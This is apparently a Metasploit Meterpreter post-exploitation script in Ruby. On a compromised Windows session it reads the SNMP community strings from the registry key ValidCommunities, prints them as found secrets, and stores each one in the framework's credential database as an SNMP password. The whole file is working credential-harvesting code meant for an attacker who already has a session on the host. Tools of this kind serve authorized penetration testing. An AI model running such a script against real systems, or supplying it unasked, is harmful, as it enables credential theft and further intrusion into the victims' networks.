
#copied getvncpw - thanks grutz/carlos

session = client

@@exec_opts = Rex::Parser::Arguments.new(
  "-h" => [ false, "Help menu."]
)

def usage()
  print("\nPull the SNMP community string from a Windows Meterpreter session\n\n")
  completed
end

def get_community(session)
  key = "HKLM\\System\\CurrentControlSet\\Services\\SNMP\\Parameters\\ValidCommunities"
  root_key, base_key = session.sys.registry.splitkey(key)
  open_key = session.sys.registry.open_key(root_key,base_key,KEY_READ)
  begin
    # oddly enough this does not return the data field which indicates ro/rw
    return open_key.enum_value.collect {|x| x.name}
  rescue
    # no registry key found or other error
    return nil
  end
end

@@exec_opts.parse(args) { |opt, idx, val|
  case opt
  when "-h"
    usage
  end
}

if client.platform =~ /win32|win64/
  print_status("Searching for community strings...")
  strs = get_community(session)
  if strs
    strs.each do |str|
      print_good("FOUND: #{str}")
      @client.framework.db.report_auth_info(
        :host	=> client.sock.peerhost,
        :port	=> 161,
        :proto	=> 'udp',
        :sname	=> 'snmp',
        :user	=> '',
        :pass	=> str,
        :type	=> "snmp.community",
        :duplicate_ok	=> true
      )
    end
  else
    print_status("Not found")
  end
else
  print_error("This version of Meterpreter is not supported with this Script!")
  raise Rex::Script::Completed
end
